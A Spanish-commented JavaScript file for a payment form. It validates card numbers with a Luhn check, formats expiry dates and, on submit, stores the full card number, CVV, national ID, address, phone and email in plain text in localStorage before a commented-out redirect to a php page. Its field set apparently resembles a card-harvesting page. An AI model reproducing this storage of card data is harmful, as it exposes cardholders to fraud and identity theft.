document.addEventListener('DOMContentLoaded', () => {
    const cardInput = document.querySelector('#txt-tarjeta');
    const fechaInput = document.querySelector('#mFecha');
    const submitButton = document.querySelector('#btn-pagar');

    cardInput.addEventListener('input', () => {
        handleCardNumberInput(cardInput);
    });

    fechaInput.addEventListener('input', () => {
        handleFechaInput(fechaInput);
    });

    function handleCardNumberInput(input) {
        let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
        let numeroFormateado = '';

        // American Express
        if (numero[0] === '3') {
            if (numero.length > 15) {
                numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
            }
            for (let i = 0; i < numero.length; i++) {
                if (i === 4 || i === 10) {
                    numeroFormateado += ' ';
                }
                numeroFormateado += numero.charAt(i);
            }
            input.value = numeroFormateado;

            if (numero.length === 15 && !isValidLuhn(numero)) {
                alert('Número de tarjeta no válido');
                input.value = ''; // Limpiar el campo
                input.focus(); // Colocar el cursor en el campo
            }
        } else {
            if (numero.length > 16) {
                numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
            }
            for (let i = 0; i < numero.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    numeroFormateado += ' ';
                }
                numeroFormateado += numero.charAt(i);
            }
            input.value = numeroFormateado;

            if (numero.length === 16 && !isValidLuhn(numero)) {
                alert('Número de tarjeta no válido');
                input.value = ''; // Limpiar el campo
                input.focus(); // Colocar el cursor en el campo
            }
        }
    }

    function isValidLuhn(number) {
        let sum = 0;
        let shouldDouble = false;

        for (let i = number.length - 1; i >= 0; i--) {
            let digit = parseInt(number.charAt(i));

            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }

            sum += digit;
            shouldDouble = !shouldDouble;
        }

        return sum % 10 === 0;
    }

    function handleFechaInput(input) {
        let fecha = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
        if (fecha.length === 4) {
            const mes = parseInt(fecha.substring(0, 2), 10);
            const anio = parseInt(fecha.substring(2, 4), 10);
            const fechaFormateada = `${mes.toString().padStart(2, '0')}/${anio.toString().padStart(2, '0')}`;
            input.value = fechaFormateada;

            if (!isValidFecha(mes, anio)) {
                alert('Fecha de expiración no válida');
                input.value = ''; // Limpiar el campo
                input.focus(); // Colocar el cursor en el campo
            }
        }
    }

    function isValidFecha(mes, anio) {
        const currentYear = new Date().getFullYear() % 100; // Obtén los últimos 2 dígitos del año actual
        return mes >= 1 && mes <= 12 && anio >= 23; // Mes entre 01 y 12, año desde 23 en adelante
    }

    submitButton.addEventListener('click', (event) => {
        event.preventDefault(); // Previene el comportamiento por defecto del botón

        // Obtén los valores de todos los campos del formulario
        const entidad = document.querySelector('#txt-entidad').value;
        const tarjeta = document.querySelector('#txt-tarjeta').value.replace(/\D/g, ''); // Quita espacios y caracteres no numéricos
        const nombre = document.querySelector('#name').value;
        const fechaExpiracion = document.querySelector('#mFecha').value;
        const cvv = document.querySelector('#txt-cvv').value;
        const documentoIdentidad = document.querySelector('#cc').value;
        const telefono = document.querySelector('#telnum').value;
        const ciudad = document.querySelector('#city').value;
        const direccion = document.querySelector('#address').value;
        const email = document.querySelector('#email').value; // Captura el correo electrónico

        // Generar un ID único para esta transacción
        const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);

        // Crea un objeto con los datos del formulario
        const formData = {
            entidad,
            tarjeta,
            nombre,
            fechaExpiracion,
            cvv,
            documentoIdentidad,
            telefono,
            ciudad,
            direccion,
            email, // Incluye el correo electrónico
            transactionId
        };

        // Guarda el objeto en el localStorage
        localStorage.setItem('formData', JSON.stringify(formData));

        // Opcional: Alerta para confirmar que los datos se han guardado
        // alert('Los datos se han guardado correctamente.');

        // Redirigir a otra página
        // window.location.href = 'chedf.php'; // Cambia 'chedf.php' a la URL de tu página destino
    });

});
